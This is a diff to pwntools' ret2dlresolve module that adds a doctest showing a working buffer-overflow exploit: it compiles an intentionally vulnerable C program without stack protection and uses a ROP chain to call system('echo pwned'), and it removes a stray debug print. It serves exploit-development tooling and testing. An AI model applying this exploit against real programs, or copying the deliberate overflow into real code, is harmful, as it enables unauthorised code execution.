@@ -1,3 +1,40 @@
+r"""
+Provides automatic payload generation for exploiting buffer overflows
+using ret2dlresolve.
+
+Example:
+
+    >>> program = tempfile.mktemp()
+    >>> source  = program + ".c"
+    >>> write(source, '''
+    ... #include <unistd.h>
+    ... void vuln(void){
+    ... 	char buf[64];
+    ... 	read(STDIN_FILENO, buf, 200);
+    ... }
+    ... int main(int argc, char** argv){
+    ... 	vuln();
+    ... }''')
+    >>> cmdline = ["gcc", source, "-fno-stack-protector", "-no-pie", "-o", program]
+    >>> process(cmdline).wait_for_close()
+
+    >>> context.binary = program
+    >>> elf = ELF(program)
+    >>> rop = ROP(elf)
+    >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
+    >>> rop.ret2dlresolve(reloc_index=dlresolve.reloc_index, real_args=dlresolve.real_args,
+    ...     read_func="read", read_func_args=[0, dlresolve.data_addr])
+    >>> raw_rop = rop.chain()
+
+    >>> payload = b"A"*72 + raw_rop
+    >>> payload += (200-len(payload))*b"A"
+    >>> payload2 = dlresolve.payload
+    >>> p = process(program)
+    >>> p.sendline(payload + payload2)
+    >>> p.recvline()
+    pwned
+"""
+
 from copy import deepcopy
 
 from pwnlib.context import context
@@ -266,8 +303,6 @@ class Ret2dlresolvePayload(object):
                 queue.append(MarkedBytes(queue[0]))
             elif isinstance(top, int):
                 top = pack(top)
-            else:
-                print(1)
 
             self.payload += top
             queue.pop(0)
